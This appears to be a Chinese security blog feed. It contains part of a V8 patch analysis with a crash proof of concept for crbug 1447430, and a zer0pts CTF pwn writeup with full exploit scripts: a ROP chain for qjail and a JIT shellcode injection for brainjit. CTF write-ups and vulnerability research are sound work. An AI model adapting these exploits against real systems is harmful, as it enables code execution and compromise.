<span class="n">LookupIterator</span><span class="o">::</span><span class="n">Configuration</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">ComputeConfiguration</span><span class="p">(</span>
    <span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Configuration</span> <span class="n">configuration</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="p">(</span><span class="o">!</span><span class="n">name</span><span class="p">.</span><span class="n">is_null</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">name</span><span class="o">-&gt;</span><span class="n">IsPrivate</span><span class="p">(</span><span class="n">isolate</span><span class="p">))</span> <span class="o">?</span> <span class="n">OWN_SKIP_INTERCEPTOR</span> <span class="c1">// 当前仅当Lookup的Name为Private时,</span>
                                                       <span class="o">:</span> <span class="n">configuration</span><span class="p">;</span>       <span class="c1">// 进行OWN_SKIP_INTERCEPTOR搜索</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="p">...</span>
<span class="n">DEF_GETTER</span><span class="p">(</span><span class="n">Name</span><span class="p">,</span> <span class="n">IsPrivate</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">IsSymbol</span><span class="p">(</span><span class="n">cage_base</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">Symbol</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">).</span><span class="n">is_private</span><span class="p">();</span> <span class="c1">// 需要name为Symbol类型，并symbol需要为private</span>
<span class="p">}</span>
</code></pre></div></div>

<p>所以当Lookup时传入PrivateSymbol，且lookup_start_object不是Receiver时，会导致我们得到的holder_，即属性持有者变量，可能实际上是从prototype中搜索得到的，而在语义中，由于我们进行的是OWN_SKIP_INTERCEPTOR的搜索，预期为lookup_start_object是属性持有者，返回的holder应是该对象中的属性</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code> template &lt;bool is_element&gt;
 void LookupIterator::Start() {
   // GetRoot might allocate if lookup_start_object_ is a string.
<span class="gd">-  holder_ = GetRoot(isolate_, lookup_start_object_, index_);
</span></code></pre></div></div>

<h2 id="poc分析">poc分析</h2>

<p>在diff结果尾部有一段测试代码</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/test/mjsunit/regress/regress-crbug-1447430.js b/test/mjsunit/regress/regress-crbug-1447430.js
</span><span class="p">new file mode 100644
</span><span class="gh">index 0000000000..c7bb3e72e3
</span><span class="gd">--- /dev/null
</span><span class="gi">+++ b/test/mjsunit/regress/regress-crbug-1447430.js
</span><span class="p">@@ -0,0 +1,34 @@</span>
<span class="gi">+// Copyright 2023 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --allow-natives-syntax
+
+var s = %CreatePrivateSymbol('x');
+
+(function TestSmi() {
+  function f(o, p) {
+    o[p] = 153;
+  }
+  (1).__proto__[s] = 42;
+  %PrepareFunctionForOptimization(f);
+  assertEquals(f(42, s), undefined);
+}());
+
+(function TestString() {
+  function f(o, p) {
+    o[p] = 153;
+  }
+  ('xyz').__proto__[s] = 42;
+  %PrepareFunctionForOptimization(f);
+  assertEquals(f('abc', s), undefined);
+}());
+
+(function TestSymbol() {
+  function f(o, p) {
+    o[p] = 153;
+  }
+  Symbol('xyz').__proto__[s] = 42;
+  %PrepareFunctionForOptimization(f);
+  assertEquals(f(Symbol('abc'), s), undefined);
+}());
</span></code></pre></div></div>

<p>在机器上编译11.4.183.17版本的v8，运行以下poc，成功使v8崩溃</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="o">%</span><span class="nx">CreatePrivateSymbol</span><span class="p">(</span><span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span><span class="nx">p</span><span class="p">){</span>
    <span class="nx">o</span><span class="p">[</span><span class="nx">p</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x33</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nx">__proto__</span><span class="p">[</span><span class="nx">s</span><span class="p">]</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">f</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nx">s</span><span class="p">));</span>
</code></pre></div></div>

<p>通过gdb调试发现崩溃点在向0x6这个地址尝试读取或写入，即3的smi表示，说明此刻f的o参数被作为了一个Tagged的变量来使用</p>

<p>在编译出来的gen/torque-generated下的instance_type.h里可以找到所有instance type的定义</p>]]></content><author><name></name></author><category term="v8" /><summary type="html"><![CDATA[patch分析]]></summary></entry><entry><title type="html">zer0pts ctf pwn writeup</title><link href="http://localhost:4000/ctf/2023/07/15/zer0pts.html" rel="alternate" type="text/html" title="zer0pts ctf pwn writeup" /><published>2023-07-15T00:20:22+08:00</published><updated>2023-07-15T00:20:22+08:00</updated><id>http://localhost:4000/ctf/2023/07/15/zer0pts</id><content type="html" xml:base="http://localhost:4000/ctf/2023/07/15/zer0pts.html"><![CDATA[<h2 id="qjail">qjail</h2>

<p>qiling模拟执行框架下的栈溢出漏洞</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">qiling</span>
<span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ELF&gt;"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'./lib/ld-2.31.so'</span><span class="p">,</span> <span class="s">'--library-path'</span><span class="p">,</span> <span class="s">'/lib'</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span>
    <span class="n">ql</span> <span class="o">=</span> <span class="n">qiling</span><span class="p">.</span><span class="n">Qiling</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">QL_VERBOSE</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">,</span><span class="n">console</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">rootfs</span><span class="o">=</span><span class="s">'.'</span><span class="p">)</span>
    <span class="n">ql</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/imgs/vuln.png" alt="vuln" /></p>

<p>看qiling源码</p>

<p>在loader/elf.py里是他的elf加载逻辑</p>

<p>其中有一段：</p>

<p><img src="/imgs/setup_aux.png" alt="setup_aux" /></p>

<p>根据经验AT_RANDOM的值指向canary</p>

<p><img src="/imgs/canary_value.png" alt="canary_value" /></p>

<p>往上翻可以看见randstraddr的来源</p>

<p>能够猜+试出来canary是7个a和一个00</p>

<p>elf加载地址在qiling的profile里的linux profile</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[OS64]
stack_address = 0x7ffffffde000
stack_size = 0x30000
load_address = 0x555555554000
interp_address = 0x7ffff7dd5000
mmap_address = 0x7fffb7dd6000
vsyscall_address = 0xffffffffff600000
</code></pre></div></div>

<p>但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围</p>

<p>这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/</p>

<p>然后就是直接看出其他段的地址，应该都是不变的</p>

<p>重新算地址，pop rdi，重回main都没问题了</p>

<p>system会有点问题，所以最后orw读flag.txt</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">pie</span> <span class="o">=</span> <span class="mh">0x7fffb7dd6000</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x7fffb7ddb000</span>

<span class="c1"># sh = process(['./sandbox.py','bin/vuln'])
</span><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.2023.zer0pts.com'</span><span class="p">,</span><span class="s">'9005'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'bin/vuln'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pie</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000000012a3</span> <span class="o">+</span> <span class="n">pie</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">pie</span> <span class="o">+</span> <span class="mh">0x11a9</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'lib/libc.so.6'</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>

<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002601f</span>
<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000142c92</span>

<span class="n">str_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># 0x000000000010257e: pop rcx; pop rbx; ret; 
</span><span class="n">pop_rcx_rbx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000010257e</span>
<span class="c1"># 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; 
</span><span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000005b622</span>

<span class="n">buff</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
    <span class="mh">0x109</span><span class="p">:</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">7</span><span class="p">,</span>
    <span class="mh">0x118</span><span class="p">:[</span>
        <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_rsi</span><span class="p">,</span>
        <span class="n">str_addr</span><span class="p">,</span>
        <span class="n">pop_rdx</span><span class="p">,</span>
        <span class="mh">0x30</span><span class="p">,</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span>

        <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="n">str_addr</span><span class="p">,</span>
        <span class="n">pop_rsi</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'open'</span><span class="p">],</span>

        <span class="n">pop_rcx_rbx</span><span class="p">,</span>
        <span class="mh">0x81</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">pop_rdx</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">pop_rsi</span><span class="p">,</span>
        <span class="n">buff</span><span class="p">,</span>
        <span class="n">mov_rdi_rax</span><span class="p">,</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span>

        <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="mi">1</span><span class="p">,</span>
        <span class="n">pop_rsi</span><span class="p">,</span>
        <span class="n">buff</span><span class="p">,</span>
        <span class="n">pop_rdx</span><span class="p">,</span>
        <span class="mh">0x80</span><span class="p">,</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span>

        <span class="n">pop_rdi</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span>
    <span class="p">]</span>
<span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># pause()
</span>
<span class="n">sh</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'something</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">pause</span><span class="p">()</span>

<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'./flag.txt'</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="brainjit">brainjit</h2>

<p>brainfxxk jit编译器，全部用python实现</p>

<p>有个功能是为多个连续的操作独立生成汇编，length标识重复长度</p>

<p><img src="/imgs/jit.png" alt="jit" /></p>

<p>jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致</p>

<p>这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用</p>

<p>漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令</p>

<p>观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="c1"># sh = process(['./app.py'])
</span>
<span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">adjust</span><span class="p">,</span><span class="n">v</span><span class="p">,</span><span class="n">old</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="s">'&gt;'</span>
    <span class="k">if</span> <span class="n">adjust</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="s">'&lt;'</span>
    <span class="n">adjust</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="n">adjust</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">d</span> <span class="o">*</span> <span class="n">adjust</span>
    <span class="k">if</span> <span class="n">old</span> <span class="o">!=</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">old</span> <span class="o">&gt;</span> <span class="n">v</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="s">'-'</span> <span class="o">*</span> <span class="p">(</span><span class="n">old</span><span class="o">-</span><span class="n">v</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="s">'+'</span> <span class="o">*</span> <span class="p">(</span><span class="n">v</span><span class="o">-</span><span class="n">old</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>
<span class="c1"># sc = asm(shellcraft.sh())
</span>
<span class="c1"># for i in sc:
#     print("code += '" + write(1,i) + "'")
</span>
<span class="n">code</span> <span class="o">=</span> <span class="s">'[+'</span> <span class="o">+</span> <span class="s">'&gt;'</span> <span class="o">*</span> <span class="mh">0x5558</span>
<span class="c1"># pop rax
# push rbp
</span>
<span class="c1"># shellcode
</span><span class="n">code</span> <span class="o">+=</span> <span class="s">'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++++++++++++'</span>
<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;+++++'</span>

<span class="n">code</span> <span class="o">+=</span> <span class="s">'&gt;[+'</span> <span class="o">+</span> <span class="s">'&gt;'</span> <span class="o">*</span> <span class="mh">0xc3</span>
<span class="c1"># ret
</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn.2023.zer0pts.com'</span><span class="p">,</span><span class="s">'9004'</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="c1"># zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}
</span></code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><summary type="html"><![CDATA[qjail qiling模拟执行框架下的栈溢出漏洞 #!/usr/bin/env python3 import qiling from qiling.const import QL_VERBOSE import sys if __name__ == '__main__': if len(sys.argv) &lt; 2: print(f"Usage: {sys.argv[0]} &lt;ELF&gt;") sys.exit(1) cmd = ['./lib/ld-2.31.so', '--library-path', '/lib', sys.argv[1]] ql = qiling.Qiling(cmd, verbose=QL_VERBOSE.DEBUG,console=False, rootfs='.') ql.run() 看qiling源码 在loader/elf.py里是他的elf加载逻辑 其中有一段： 根据经验AT_RANDOM的值指向canary 往上翻可以看见randstraddr的来源 能够猜+试出来canary是7个a和一个00 elf加载地址在qiling的profile里的linux profile [OS64] stack_address = 0x7ffffffde000 stack_size = 0x30000 load_address = 0x555555554000 interp_address = 0x7ffff7dd5000 mmap_address = 0x7fffb7dd6000 vsyscall_address = 0xffffffffff600000 但是这里由于qiling启动的是ld，所以之前看到的pie地址其实是ld的，elf在profile里的mmap地址范围 这里还是通过qiling的gdb server调试才发现的，https://docs.qiling.io/en/latest/debugger/ 然后就是直接看出其他段的地址，应该都是不变的 重新算地址，pop rdi，重回main都没问题了 system会有点问题，所以最后orw读flag.txt from pwn import * context.arch = 'amd64' pie = 0x7fffb7dd6000 libc_base = 0x7fffb7ddb000 # sh = process(['./sandbox.py','bin/vuln']) sh = remote('pwn.2023.zer0pts.com','9005') elf = ELF('bin/vuln',checksec=False) elf.address = pie pop_rdi = 0x00000000000012a3 + pie main = pie + 0x11a9 libc = ELF('lib/libc.so.6',checksec=False) libc.address = libc_base pop_rsi = libc_base + 0x000000000002601f pop_rdx = libc_base + 0x0000000000142c92 str_addr = elf.bss(0x100) # 0x000000000010257e: pop rcx; pop rbx; ret; pop_rcx_rbx = libc_base + 0x000000000010257e # 0x000000000005b622: mov rdi, rax; cmp rdx, rcx; jae 0x5b60c; mov rax, r8; ret; mov_rdi_rax = libc_base + 0x000000000005b622 buff = elf.bss(0x180) payload = flat({ 0x109:b'a' * 7, 0x118:[ pop_rdi, 0, pop_rsi, str_addr, pop_rdx, 0x30, libc.sym['read'], pop_rdi, str_addr, pop_rsi, 0, libc.sym['open'], pop_rcx_rbx, 0x81, 0, pop_rdx, 0x80, pop_rsi, buff, mov_rdi_rax, libc.sym['read'], pop_rdi, 1, pop_rsi, buff, pop_rdx, 0x80, libc.sym['write'], pop_rdi, 0, libc.sym['exit'] ] },filler=b'\x00') # pause() sh.sendlineafter(b'something\n',payload) pause() sh.send(b'./flag.txt') sh.interactive() brainjit brainfxxk jit编译器，全部用python实现 有个功能是为多个连续的操作独立生成汇编，length标识重复长度 jit利用漏洞种类比较少，一般是指令生成错误或者生成过程中溢出截断导致 这题里shellcode分有数据区跟代码区，但是中间的越界会被python层捕获，无法利用 漏洞是缺少方括号闭合检查，导致可以跳到jz指令末尾的0xff上，跟后面的指令偏一下，就可以执行一两个字节的指令 观察一下寄存器环境后不难写出push pop ret这3个字节的shellcode，利用数据区的rwx属性，往数据区里填充execve的shellcode，最后跳转过去 from pwn import * context.arch = 'amd64' # sh = process(['./app.py']) idx = 0 def write(adjust,v,old=0): d = '&gt;' if adjust &lt; 0: d = '&lt;' adjust = abs(adjust) payload = d * adjust if old != None and old &gt; v: payload += '-' * (old-v) else: payload += '+' * (v-old) return payload # sc = asm(shellcraft.sh()) # for i in sc: # print("code += '" + write(1,i) + "'") code = '[+' + '&gt;' * 0x5558 # pop rax # push rbp # shellcode code += '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code += '&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' code 